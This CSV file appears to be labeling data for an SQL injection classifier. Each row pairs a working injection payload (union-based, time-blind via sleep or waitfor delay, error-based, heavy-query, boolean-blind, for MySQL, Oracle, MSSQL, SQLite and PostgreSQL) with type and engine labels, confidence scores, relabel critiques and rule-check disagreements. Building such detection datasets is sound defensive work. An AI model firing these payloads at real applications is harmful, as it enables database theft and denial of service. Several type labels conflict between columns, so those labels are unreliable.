payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,payload_inner,wrapper_detected,strip_depth,a_type,a_db,a_signals,c_type,c_db,c_signals
"-2384'|| ( select 'vhcp' from dual where 1266 = 1266 union all select 1266,1266,1266,1266--",union_based,oracle,0.7,oracle_union,RELABEL,reasoning too short (12 chars),union_based,oracle,"-2384'|| ( select 'vhcp' from dual where 1266 = 1266 union all select 1266,1266,1266,1266--",False,0,union_based,oracle,Pattern match: 'union all select' → union_based (P7); DB signature: oracle,union_based,oracle,UNION SELECT structure
"-7350' ) ) ) union all select 9207,9207,9207,9207--",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,"-7350' ) ) ) union all select 9207,9207,9207,9207--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
1 rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,time_blind,mysql,0.7,rlike_sleep,RELABEL,reasoning too short (11 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,mysql,1 rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,False,0,boolean_blind,mysql,Pattern match: 'rlike (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)"
"1"" and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )",time_blind,postgresql,0.7,regexp_substring,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,generic,"1"" and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )",False,0,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload)
"1 and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) -- mwsm",error_based,mysql,0.9,updatexml,RELABEL,reasoning too short (9 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,"1 and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) -- mwsm",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
-1866' ) ) as cwtv where 3295 = 3295 order by 1--,boolean_blind,generic,0.5,order_by,RELABEL,reasoning too short (8 chars); confidence too low (0.50),boolean_blind,generic,-1866' ) ) as cwtv where 3295 = 3295 order by 1--,False,0,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal
"1 ) as zqxa where 5718 = 5718 and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",heavy_query,generic,0.7,domain_join,RELABEL,reasoning too short (11 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"1 ) as zqxa where 5718 = 5718 and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"-2054%"" ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( ""%"" = """,error_based,mssql,0.9,convert_char,RELABEL,reasoning too short (12 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"-2054%"" ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( ""%"" = """,False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"1"" ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ( ""usht"" like ""usht",time_blind,postgresql,0.7,regexp_substring,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,generic,"1"" ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ( ""usht"" like ""usht",False,0,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload)
"1"" where 1683 = 1683 or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #",time_blind,mysql,0.7,sleep_subquery,RELABEL,reasoning too short (14 chars),time_blind,mysql,"1"" where 1683 = 1683 or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #",False,0,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal
"-1908"" ) where 6420 = 6420 union all select 6420,6420,6420,6420--",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,"-1908"" ) where 6420 = 6420 union all select 6420,6420,6420,6420--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1"" ) ) and make_set ( 8403 = 8403,8899 ) and ( ( ""nsyl"" = ""nsyl",boolean_blind,mysql,0.7,make_set,RELABEL,reasoning too short (8 chars),boolean_blind,mysql,"1"" ) ) and make_set ( 8403 = 8403,8899 ) and ( ( ""nsyl"" = ""nsyl",False,0,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check
waitfor delay '0:0:5' and ( '%' = ',time_blind,mssql,0.9,waitfor,RELABEL,reasoning too short (7 chars),time_blind,mssql,waitfor delay '0:0:5' and ( '%' = ',False,0,time_blind,mssql,Pattern match: 'waitfor delay' → time_blind (P5); DB signature: mssql,time_blind,mssql,time function 'waitfor delay' detected
"-5800"" ) or 6872 = 6872 and ( ""tcab"" like ""tcab",boolean_blind,generic,0.5,or_equality,RELABEL,reasoning too short (11 chars); confidence too low (0.50),boolean_blind,generic,"-5800"" ) or 6872 = 6872 and ( ""tcab"" like ""tcab",False,0,boolean_blind,generic,Pattern match: 'or 6872 = 6872' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)"
select ( case when ( 4415 = 2051 ) then 4415 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,boolean_blind,oracle,0.7,case_cast,RELABEL,reasoning too short (9 chars),boolean_blind,oracle,select ( case when ( 4415 = 2051 ) then 4415 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,False,0,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal
"-6097%' ) ) union all select 3990,3990,3990,3990,3990,3990--",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,"-6097%' ) ) union all select 3990,3990,3990,3990,3990,3990--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
1' and 9198 = 9198--,boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,1' and 9198 = 9198--,False,0,boolean_blind,generic,Pattern match: 'and 9198 = 9198' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)"
"1%"" ) ) or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,oracle,0.7,oracle_sysjoin,RELABEL,reasoning too short (14 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"1%"" ) ) or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
1' ) as xwlf where 9424 = 9424,boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,1' ) as xwlf where 9424 = 9424,False,0,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal
"1"" ) as xsgx where 5239 = 5239 union all select null,null--",union_based,generic,0.7,union_null,RELABEL,reasoning too short (10 chars),union_based,generic,"1"" ) as xsgx where 5239 = 5239 union all select null,null--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"-7737'|| ( select 'xalo' where 9219 = 9219 union all select 9219,9219,9219,9219#",union_based,oracle,0.7,oracle_union,RELABEL,reasoning too short (12 chars),union_based,oracle,"-7737'|| ( select 'xalo' where 9219 = 9219 union all select 9219,9219,9219,9219#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1%' and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and '%' = '",time_blind,postgresql,0.7,regexp_substring,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,generic,"1%' and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and '%' = '",False,0,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload)
"1'+ ( select 'midn' where 2819 = 2819 or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) ) +'",heavy_query,generic,0.7,domain_join,RELABEL,reasoning too short (11 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"1'+ ( select 'midn' where 2819 = 2819 or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) ) +'",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"1 ) where 8856 = 8856 or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,0.7,like_randomblob,RELABEL,reasoning too short (15 chars),time_blind,sqlite,"1 ) where 8856 = 8856 or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",False,0,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload)
"-5630"" ) or 3038 = 3038",boolean_blind,generic,0.5,or_equality,RELABEL,reasoning too short (11 chars); confidence too low (0.50),boolean_blind,generic,"-5630"" ) or 3038 = 3038",False,0,boolean_blind,generic,Pattern match: 'or 3038 = 3038' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)"
"1' union all select null,null,null,null,null,null--",union_based,generic,0.7,union_null,RELABEL,reasoning too short (10 chars),union_based,generic,"1' union all select null,null,null,null,null,null--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1 ) where 9012 = 9012 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,0.7,like_randomblob,RELABEL,reasoning too short (15 chars),time_blind,sqlite,"1 ) where 9012 = 9012 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",False,0,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload)
"1"" ) where 8657 = 8657",boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,"1"" ) where 8657 = 8657",False,0,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal
"-1302"" ) ) as rshr where 2800 = 2800 or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",out_of_band,oracle,0.9,dbms_utility,RELABEL,reasoning too short (12 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'out_of_band' (P6),boolean_blind,oracle,"-1302"" ) ) as rshr where 2800 = 2800 or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",False,0,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal
1 where 1519 = 1519,boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,1 where 1519 = 1519,False,0,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal
"1"" where 3080 = 3080 or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --",boolean_blind,mysql,0.7,if_subquery,RELABEL,reasoning too short (11 chars),boolean_blind,mysql,"1"" where 3080 = 3080 or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
1%' ) ) ) and ( 9404 = 8390 ) *8390 and ( ( ( '%' = ',boolean_blind,generic,0.5,arithmetic,RELABEL,reasoning too short (10 chars); confidence too low (0.50),boolean_blind,generic,1%' ) ) ) and ( 9404 = 8390 ) *8390 and ( ( ( '%' = ',False,0,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check
"-2704"" ) union all select 1323,1323,1323,1323,1323,1323,1323,1323,1323--",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,"-2704"" ) union all select 1323,1323,1323,1323,1323,1323,1323,1323,1323--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1%' ) ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( '%' = '",error_based,mssql,0.9,convert_char,RELABEL,reasoning too short (12 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"1%' ) ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( '%' = '",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"1' ) ) ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( ( 'tzbp' = 'tzbp",boolean_blind,mysql,0.7,if_subquery,RELABEL,reasoning too short (11 chars),boolean_blind,mysql,"1' ) ) ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( ( 'tzbp' = 'tzbp",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
